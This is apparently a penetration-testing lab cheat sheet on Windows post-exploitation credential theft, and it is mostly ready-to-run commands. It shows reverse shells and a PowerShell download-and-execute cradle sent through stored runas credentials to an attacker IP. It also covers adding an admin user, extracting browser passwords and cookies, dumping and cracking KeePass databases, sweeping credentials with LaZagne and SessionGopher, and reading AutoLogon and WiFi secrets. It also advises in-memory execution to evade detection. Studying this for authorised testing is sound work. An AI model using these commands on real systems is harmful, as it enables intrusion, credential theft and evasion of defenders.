## Further Credential Theft

Beyond file-based credentials, Windows provides multiple mechanisms for storing and reusing credentials that can all be abused post-exploitation. The techniques here each target a different storage location but follow the same pattern: enumerate what is stored, extract it, then reuse or crack it. 

***

## Cmdkey and Saved Credentials

`cmdkey` interacts directly with the Windows Credential Manager. When an administrator saves credentials with `/savecred`, they persist across reboots and can be used by anyone who can run `runas` in that user's session. 

```cmd
:: Enumerate all saved credentials
cmdkey /list

:: Output shows:
:: Target: LegacyGeneric:target=TERMSRV/SQL01   <- RDP saved session
:: Type: Generic
:: User: inlanefreight\bob

:: Target: Domain:target=*.sharepoint.com       <- Microsoft account
:: Target: WindowsLive:target=virtualapp/...    <- Local account
```

### Exploiting with runas /savecred

```powershell
:: Execute any command as the stored user without needing the password
runas /savecred /user:inlanefreight\bob "cmd.exe /c whoami > C:\Windows\Temp\out.txt"

:: Reverse shell using stored credentials
runas /savecred /user:inlanefreight\bob "C:\Windows\Temp\nc.exe 10.10.14.3 8443 -e cmd"

:: Add current user to admins using stored admin credentials
runas /savecred /user:WORKGROUP\Administrator "cmd /c net localgroup administrators htb-student /add"

:: PowerShell reverse shell via stored credentials
runas /savecred /user:inlanefreight\bob "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/shell.ps1')"
```

```powershell
# PowerShell alternative using PSCredential object (when password is known)
$pass = ConvertTo-SecureString "Password123!" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("inlanefreight\bob", $pass)
Start-Process -FilePath powershell.exe -ArgumentList "C:\Windows\Temp\nc.exe 10.10.14.3 8443 -e cmd" -Credential $creds
```

***

## Browser Credentials

Chrome and Chromium-based browsers protect saved passwords with DPAPI, binding the encryption to the current user's session. Running as that user means you can decrypt them directly without any keys. 

### SharpChrome - Chromium Password Extraction

```powershell
# Basic extraction - works in unprivileged context as current user
.\SharpChrome.exe logins /unprotect

# Supports Chrome, Edge, Brave, Opera
.\SharpChrome.exe logins /browser:chrome /unprotect
.\SharpChrome.exe logins /browser:edge /unprotect

# Also extract cookies (useful for session hijacking)
.\SharpChrome.exe cookies /unprotect

# Output format:
# file_path, signon_realm, origin_url, date_created, times_used, username, password

# Remote extraction using DPAPI domain backup key (requires Domain Admin)
# Step 1: Get backup key
.\SharpChrome.exe backupkey /server:DC01.inlanefreight.local /file:backup.pvk
# Step 2: Decrypt any domain user's Chrome passwords
.\SharpChrome.exe logins /pvk:backup.pvk /server:WORKSTATION01
```

### Manual Chrome Database Extraction

```powershell
# Chrome stores credentials in SQLite
$loginDB = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"

# Copy the file (Chrome locks it when open)
copy $loginDB C:\Windows\Temp\ChromeLogins

# Transfer to attack machine and query with sqlite3
# sqlite3 ChromeLogins "SELECT origin_url, username_value, password_value FROM logins"
# Passwords will be DPAPI-encrypted blobs - need SharpChrome/Mimikatz to decrypt

# Alternatively use Mimikatz DPAPI module
# mimikatz # dpapi::chrome /in:"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data"
```

### Detection Note

Chrome credential extraction generates Windows Event ID 4688 (process creation) and 16385 (DPAPI activity), which blue teams actively monitor. Running SharpChrome in-memory via a C2 framework significantly reduces this detection surface. 

***

## KeePass Database Extraction and Cracking

```powershell
# Find KeePass databases on the system and shares
Get-ChildItem C:\ -Recurse -Filter "*.kdbx" -ErrorAction SilentlyContinue | Select-Object FullName
Get-ChildItem "\\FILE01\users" -Recurse -Filter "*.kdbx" -ErrorAction SilentlyContinue

# If KeePass is running, try dumping master password from memory
# KeePass 2.x stores the master key derivation in memory
# Tool: KeeTheft or KeeFarce (injects into KeePass process)
.\KeeFarce.exe
# Output: KeePass export saved to C:\Users\user\AppData\Roaming\KeePass\export.xml
```

```bash
# Extract hash for offline cracking
python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx > keepass.hash

# Crack with hashcat (mode 13400 = KeePass 1/2)
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt

# With rules for better coverage
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Alternative: John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt keepass.hash
```

```bash
# Once master password is cracked, access the database
# Option 1: kpcli (CLI)
kpcli --kdb=ILFREIGHT_Help_Desk.kdbx
kpcli:/> ls
kpcli:/> cd IT\ Admin/
kpcli:/> show -f 0        # show entry 0 with password visible

# Option 2: python-keepass
pip install keepass
python3 -c "
from keepass import open as kp_open
db = kp_open('ILFREIGHT_Help_Desk.kdbx', password='panther1')
for entry in db.obj_root.findall('.//Entry'):
    print(entry)
"
```

***

## SessionGopher - Remote Access Tool Credentials

SessionGopher queries `HKEY_USERS` for all logged-on users and extracts saved session data from WinSCP, PuTTY, SuperPuTTY, FileZilla, and RDP. 

```powershell
Import-Module .\SessionGopher.ps1

# Current host, current user context
Invoke-SessionGopher -Target WINLPE-SRV01

# All users on current host (requires local admin)
Invoke-SessionGopher -Target WINLPE-SRV01 -AllUsers

# Remote host (requires admin on remote)
Invoke-SessionGopher -Target DC01.inlanefreight.local

# Entire domain - sweep all domain-joined machines
Invoke-SessionGopher -iL C:\hosts.txt -AllUsers

# Search for .ppk, .rdp, .sdtid files on all drives
Invoke-SessionGopher -Thorough

# Output tells you:
# Source   : hostname\username
# Session  : saved session name
# Hostname : target hostname
# Username : srvadmin      <- this is the credential to reuse
# Password : (decrypted if available)
```

***

## Registry Cleartext Credentials

### Windows AutoLogon

```cmd
:: Read AutoLogon config (accessible to all users, no admin needed)
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

:: Specifically target the credential fields
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon
:: AutoAdminLogon = 1 and DefaultPassword present = cleartext admin credentials
```

### PuTTY Proxy Credentials

```cmd
:: List all saved PuTTY sessions
reg query HKCU\SOFTWARE\SimonTatham\PuTTY\Sessions

:: Dump a specific session (URL-encoded names use %20 for spaces)
reg query "HKCU\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh"
:: Look for ProxyUsername and ProxyPassword values

:: Dump all PuTTY sessions at once
reg query HKCU\SOFTWARE\SimonTatham\PuTTY\Sessions /s | findstr /i "ProxyUsername\|ProxyPassword\|HostName"

:: If admin, search all users' hives
reg query HKU /s /f "SimonTatham" 2>nul
```

***

## LaZagne - Comprehensive Credential Recovery

LaZagne is the most comprehensive single-binary credential sweep tool, covering 60+ applications across browsers, sysadmin tools, databases, git, chat clients, and Windows internals. 

```powershell
# Run all modules - broadest sweep
.\lazagne.exe all

# Run all with verbose output
.\lazagne.exe all -v

# Save results to file
.\lazagne.exe all -oN          # plaintext output
.\lazagne.exe all -oJ          # JSON output (better for parsing)
.\lazagne.exe all -oA          # all formats

# Targeted modules (less noise, faster)
.\lazagne.exe windows          # Credman, DPAPI, Autologon, LSA secrets
.\lazagne.exe browsers         # Chrome, Firefox, IE, Edge
.\lazagne.exe sysadmin         # WinSCP, PuTTY, FileZilla, OpenVPN
.\lazagne.exe databases        # MySQL, Oracle, DBngin, PostgreSQL
.\lazagne.exe wifi             # Saved WiFi passwords
.\lazagne.exe mails            # Outlook, Thunderbird
.\lazagne.exe memory           # KeePass from memory, mimikatz-style

# Specific application
.\lazagne.exe browsers -firefox
.\lazagne.exe sysadmin -winscp
```

***

## WiFi Passwords

```cmd
:: List all saved WiFi profiles
netsh wlan show profiles

:: Dump all passwords at once
for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profile name="%j" key=clear 2>nul | findstr -i "key content"

:: Single profile with full details
netsh wlan show profile name="ilfreight_corp" key=clear
:: Key Content: ILFREIGHTWIFI-CORP123908!

:: PowerShell equivalent - extract all WiFi PSKs
(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups [notes.dollarboysushil](https://notes.dollarboysushil.com/windows-privilege-escalation/credential-theft).Value.Trim(); $_} |
%{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" |
%{$pass=$_.Matches.Groups [notes.dollarboysushil](https://notes.dollarboysushil.com/windows-privilege-escalation/credential-theft).Value.Trim(); Write-Host "$name => $pass"}
```

***

## Full Credential Sweep Flow

```
Land on target
    |
    v
1. cmdkey /list          -> Saved credentials for TERMSRV (RDP) or network shares
   If found -> runas /savecred /user:<user> "<reverse_shell>"

2. reg query Winlogon    -> AutoLogon cleartext credentials
   reg query PuTTY sessions -> Proxy credentials

3. .\lazagne.exe all     -> Broadest sweep of all application credential stores

4. .\SessionGopher.ps1   -> Remote access tool sessions (WinSCP, PuTTY, FileZilla, RDP)

5. .\SharpChrome.exe logins /unprotect -> Saved website logins from Chrome/Edge/Brave

6. netsh wlan show profile <name> key=clear -> WiFi PSKs (may reuse as domain/local passwords)

7. Find .kdbx file?
   -> keepass2john -> hashcat -m 13400 -> kpcli -> extract all stored credentials

8. Exchange access?
   -> MailSniper to search email body for "password", "creds", "credentials"
```
